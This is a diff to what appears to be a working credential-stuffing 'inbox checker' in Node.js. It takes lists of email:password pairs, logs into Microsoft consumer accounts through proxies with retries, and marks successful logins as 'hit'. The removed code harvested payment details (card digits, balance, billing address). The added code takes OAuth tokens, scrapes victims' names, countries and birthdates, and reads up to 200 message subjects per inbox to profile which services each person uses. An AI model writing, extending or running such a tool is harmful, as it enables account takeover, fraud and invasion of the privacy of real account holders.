+    const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${encodeURIComponent(authCode)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;
+
+    const tokenResp = await proxiedFetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
+      method: "POST",
+      body: tokenData,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookieJar.toString(),
+      },
+      signal: AbortSignal.timeout(15000),
+    });
+    const tokenText = await tokenResp.text();
+
+    if (!tokenText.includes("access_token")) {
+      result.detail = "token exchange failed";
       return result;
     }
 
-    const cookieStr = cookieJar.toString();
-    if ((cookieStr.includes("ANON") || cookieStr.includes("WLSSC")) &&
-        finalUrl.includes("https://login.live.com/oauth20_desktop.srf?")) {
-      result.status = "hit";
-    } else {
-      result.status = "fail";
-      result.detail = "login failed";
-      return result;
-    }
+    let tokenJson;
+    try { tokenJson = JSON.parse(tokenText); } catch { result.detail = "token parse failed"; return result; }
+    const accessToken = tokenJson.access_token;
+    if (!accessToken) { result.detail = "no access_token"; return result; }
 
-    // ── Step 2: Get substrate access token ──
-    let accessToken = "";
-    let refreshToken = parseLR(finalUrl, "refresh_token=", "&");
-    if (!refreshToken) refreshToken = parseLR(body, "refresh_token=", "&");
+    result.status = "hit";
 
-    if (refreshToken) {
-      try {
-        const tokenData = new URLSearchParams({
-          grant_type: "refresh_token",
-          client_id: "0000000048170EF2",
-          scope: "https://substrate.office.com/User-Internal.ReadWrite",
-          redirect_uri: "https://login.live.com/oauth20_desktop.srf",
-          refresh_token: refreshToken,
-          uaid: "db28da170f2a4b85a26388d0a6cdbb6e",
-        });
+    // ── Step 5: Profile information ──
+    const profileHeaders = {
+      "User-Agent": "Outlook-Android/2.0",
+      "Authorization": `Bearer ${accessToken}`,
+      "X-AnchorMailbox": `CID:${cid}`,
+    };
 
-        const tokenResp = await proxiedFetch("https://login.live.com/oauth20_token.srf", {
-          method: "POST",
-          body: tokenData.toString(),
-          headers: {
-            "x-ms-sso-Ignore-SSO": "1",
-            "User-Agent": "Outlook-Android/2.0",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Host": "login.live.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip",
-          },
-          signal: AbortSignal.timeout(15000),
-        });
-        const tokenJson = await tokenResp.json();
-        accessToken = tokenJson.access_token || "";
-      } catch {}
-    }
+    let country = "";
+    let name = "";
+    let birthdate = "";
 
-    // ── Step 3: Get PIFD token for payment info ──
-    let pifdToken = "";
+    // 5a: V1Profile
     try {
-      const pifdResp = await sessionFetch(
-        "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none",
-        {
-          headers: {
-            "Host": "login.live.com",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Connection": "close",
-            "Referer": "https://account.microsoft.com/",
-          },
-          signal: AbortSignal.timeout(15000),
-        },
-        cookieJar
-      );
-      const pifdUrl = pifdResp._finalUrl || pifdResp.url;
-      pifdToken = parseLR(pifdUrl, "access_token=", "&token_type") || parseLR(pifdUrl, "access_token=", "&");
-      if (pifdToken) pifdToken = decodeURIComponent(pifdToken);
+      const profResp = await proxiedFetch("https://substrate.office.com/profileb2/v2.0/me/V1Profile", {
+        headers: profileHeaders,
+        signal: AbortSignal.timeout(15000),
+      });
+      if (profResp.ok) {
+        const profile = await profResp.json();
+        country = parseCountryFromJson(profile);
+        name = parseNameFromJson(profile);
+        const bd = profile.birthDay, bm = profile.birthMonth, by = profile.birthYear;
+        if (bd) birthdate = `${bd}-${bm}-${by}`;
+      }
     } catch {}
 
-    // ── Step 4: Payment instruments ──
-    if (pifdToken) {
+    // 5b: Graph API fallback for country/name
+    if (!country) {
       try {
-        const payResp = await proxiedFetch(
-          "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
-          {
-            headers: {
-              "User-Agent": USER_AGENT,
-              "Pragma": "no-cache",
-              "Accept": "application/json",
-              "Accept-Language": "en-US,en;q=0.9",
-              "Authorization": `MSADELEGATE1.0="${pifdToken}"`,
-              "Content-Type": "application/json",
-              "Origin": "https://account.microsoft.com",
-              "Referer": "https://account.microsoft.com/",
-            },
-            signal: AbortSignal.timeout(15000),
-          }
-        );
-        const payBody = await payResp.text();
-
-        const name = parseLR(payBody, '"accountHolderName":"', '"');
-        if (name) result.captures["Name"] = name;
-
-        const addr1 = parseLR(payBody, '"address":{"address_line1":"', '"');
-        const city = parseLR(payBody, '"city":"', '"');
-        const region = parseLR(payBody, '"region":"', '"');
-        const zipcode = parseLR(payBody, '"postal_code":"', '"');
-        if (addr1 || city) result.captures["Address"] = `${addr1} | ${city} | ${region} | ${zipcode}`;
-
-        const balance = parseLR(payBody, 'balance":', ',"');
-        if (balance) result.captures["Balance"] = `$${balance}`;
-
-        const last4 = parseLR(payBody, '"lastFourDigits":"', '",');
-        const cardType = parseLR(payBody, '"cardType":"', '"');
-        if (last4) result.captures["CC"] = `****${last4} (${cardType})`;
+        const graphResp = await proxiedFetch("https://graph.microsoft.com/v1.0/me", {
+          headers: profileHeaders,
+          signal: AbortSignal.timeout(15000),
+        });
+        if (graphResp.ok) {
+          const graphData = await graphResp.json();
+          if (!country) country = parseCountryFromJson(graphData);
+          if (!name) name = parseNameFromJson(graphData);
+        }
       } catch {}
     }
 
-    // ── Step 5: Search inbox for ALL services ──
-    const anchor = refreshToken ? `CID:${refreshToken}` : "";
-    if (accessToken && accessToken.startsWith("Ew")) {
-      const mailHeaders = {
-        "User-Agent": "Outlook-Android/2.0",
-        "Pragma": "no-cache",
-        "Accept": "application/json",
-        "ForceSync": "false",
-        "Authorization": `Bearer ${accessToken}`,
-        "X-AnchorMailbox": anchor,
-        "Host": "substrate.office.com",
-        "Connection": "Keep-Alive",
-        "Accept-Encoding": "gzip",
+    result.country = country;
+    result.name = name;
+    result.birthdate = birthdate;
+
+    // ── Step 6: Inbox data — Multiple sources ──
+    let allMessagesText = "";
+    const allMessagesJson = [];
+
+    // 6a: StartupData
+    try {
+      const startupHeaders = {
+        "Host": "outlook.live.com",
+        "content-length": "0",
+        "x-owa-sessionid": randomUUID(),
+        "x-req-source": "Mini",
+        "authorization": `Bearer ${accessToken}`,
+        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36",
+        "action": "StartupData",
+        "x-owa-correlationid": randomUUID(),
+        "content-type": "application/json; charset=utf-8",
+        "accept": "*/*",
       };
 
-      // Search each service
-      for (const svc of SERVICES) {
-        try {
-          const searchBody = {
-            Cvid: "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
-            Scenario: { Name: "owa.react" },
-            TimeZone: "UTC",
-            TextDecorations: "Off",
-            EntityRequests: [{
-              EntityType: "Conversation",
-              ContentSources: ["Exchange"],
-              Filter: {
-                Or: [
-                  { Term: { DistinguishedFolderName: "msgfolderroot" } },
-                  { Term: { DistinguishedFolderName: "DeletedItems" } },
-                ],
-              },
-              From: 0,
-              Query: { QueryString: svc.keyword },
-              RefiningQueries: null,
-              Size: 25,
-              Sort: [
-                { Field: "Score", SortDirection: "Desc", Count: 3 },
-                { Field: "Time", SortDirection: "Desc" },
-              ],
-              EnableTopResults: true,
-              TopResultsCount: 3,
-            }],
-            AnswerEntityRequests: [{
-              Query: { QueryString: svc.keyword },
-              EntityTypes: ["Event", "File"],
-              From: 0, Size: 10,
-              EnableAsyncResolution: true,
-            }],
-            QueryAlterationOptions: {
-              EnableSuggestion: true,
-              EnableAlteration: true,
-              SupportedRecourseDisplayTypes: [
-                "Suggestion", "NoResultModification",
-                "NoResultFolderRefinerModification",
-                "NoRequeryModification", "Modification",
-              ],
-            },
-            LogicalId: "446c567a-02d9-b739-b9ca-616e0d45905c",
-          };
-
-          const searchResp = await proxiedFetch(
-            "https://outlook.live.com/search/api/v2/query?n=124",
-            {
-              method: "POST",
-              body: JSON.stringify(searchBody),
-              headers: { ...mailHeaders, "Content-Type": "application/json" },
-              signal: AbortSignal.timeout(10000),
-            }
-          );
-
-          const searchText = await searchResp.text();
-          let searchJson = {};
-          try { searchJson = JSON.parse(searchText); } catch {}
-
-          const totalMsgs = extractTotalMessages(searchJson, searchText);
-
-          if (totalMsgs > 0) {
-            // Extract snippet
-            let snippet = "";
-            for (const key of ["HitHighlightedSummary", "Summary", "Preview", "Snippet"]) {
-              const vals = findNestedValues(searchJson, key);
-              for (const v of vals) {
-                if (typeof v === "string" && v.trim()) { snippet = v.trim(); break; }
-              }
-              if (snippet) break;
-            }
-            if (snippet) snippet = snippet.replace(/\[.*?\]/g, "").trim().slice(0, 120);
-
-            // Extract date
-            let lastDate = "";
-            for (const key of ["LastDeliveryTime", "ReceivedDateTime", "DateTimeSent"]) {
-              const vals = findNestedValues(searchJson, key);
-              for (const v of vals) {
-                if (typeof v === "string" && v.trim()) { lastDate = v.trim(); break; }
-              }
-              if (lastDate) break;
-            }
-            if (lastDate && lastDate.includes("T")) lastDate = lastDate.split("T")[0];
-
-            result.services[svc.label] = {
-              found: true,
-              count: totalMsgs,
-              snippet: snippet || "",
-              date: lastDate || "",
-              category: svc.category,
-            };
-          }
-        } catch {
-          // Skip failed service search silently
+      const startupResp = await proxiedFetch(
+        `https://outlook.live.com/owa/${encodeURIComponent(email)}/startupdata.ashx?app=Mini&n=0`,
+        {
+          method: "POST",
+          body: "",
+          headers: startupHeaders,
+          signal: AbortSignal.timeout(30000),
         }
+      );
+      if (startupResp.ok) {
+        const text = await startupResp.text();
+        allMessagesText += text.toLowerCase() + " ";
+        allMessagesJson.push(text);
       }
+    } catch {}
+
+    // 6b: Graph API Messages
+    try {
+      const graphMsgResp = await proxiedFetch(
+        "https://graph.microsoft.com/v1.0/me/messages?$top=200&$select=from,subject",
+        {
+          headers: {
+            "Authorization": `Bearer ${accessToken}`,
+            "Accept": "application/json",
+            "User-Agent": "Mozilla/5.0",
+          },
+          signal: AbortSignal.timeout(30000),
+        }
+      );
+      if (graphMsgResp.ok) {
+        const text = await graphMsgResp.text();
+        allMessagesText += text.toLowerCase() + " ";
+        allMessagesJson.push(text);
+      }
+    } catch {}
+
+    // 6c: Office365 API Messages
+    try {
+      const officeResp = await proxiedFetch(
+        "https://outlook.office.com/api/v2.0/me/messages?$top=200&$select=From,Subject",
+        {
+          headers: {
+            "Authorization": `Bearer ${accessToken}`,
+            "Accept": "application/json",
+            "User-Agent": "Outlook-Android/2.0",
+            "X-AnchorMailbox": `CID:${cid}`,
+          },
+          signal: AbortSignal.timeout(30000),
+        }
+      );
+      if (officeResp.ok) {
+        const text = await officeResp.text();
+        allMessagesText += text.toLowerCase() + " ";
+        allMessagesJson.push(text);
+      }
+    } catch {}
+
+    // ── Step 7: Count services ──
+    const foundServices = countServiceMessagesWithSubjects(allMessagesText, allMessagesJson, SERVICES);
+    result.services = foundServices;
+
+    if (Object.keys(foundServices).length === 0) {
+      result.status = "fail";
+      result.detail = "no services found";
     }
 
   } catch (err) {
@@ -655,9 +536,12 @@ async function attemptCheck(email, password) {
   return result;
 }
 
+// ── Single account with retries ──
+
 async function checkSingleAccount(email, password) {
+  let result;
   for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
-    const result = await attemptCheck(email, password);
+    result = await attemptCheck(email, password);
     if (result.status === "retry") {
       if (attempt < MAX_RETRIES - 1) {
         await delay(RETRY_DELAY * (attempt + 1));
@@ -668,6 +552,7 @@ async function checkSingleAccount(email, password) {
     }
     return result;
   }
+  return result;
 }
 
 // ── Batch checker ───────────────────────────────────────────
@@ -695,14 +580,17 @@ async function checkInboxAccounts(accounts, threads = 5, onProgress, signal) {
           captures: {},
           services: {},
           detail: "invalid format",
+          country: "",
+          name: "",
+          birthdate: "",
         });
         completed++;
         continue;
       }
 
       const email = parts[0].trim();
-      const password = parts.slice(1).join(":").trim();
-      const r = await checkSingleAccount(email, password);
+      const pw = parts.slice(1).join(":").trim();
+      const r = await checkSingleAccount(email, pw);
       results.push(r);
       completed++;
 
@@ -726,11 +614,11 @@ async function checkInboxAccounts(accounts, threads = 5, onProgress, signal) {
 }
 
 function getServiceList() {
-  return SERVICES;
+  return Object.entries(SERVICES).map(([email, name]) => ({ email, name }));
 }
 
 function getServiceCount() {
-  return SERVICES.length;
+  return new Set(Object.values(SERVICES)).size;
 }
 
 module.exports = { checkInboxAccounts, getServiceList, getServiceCount, SERVICES };
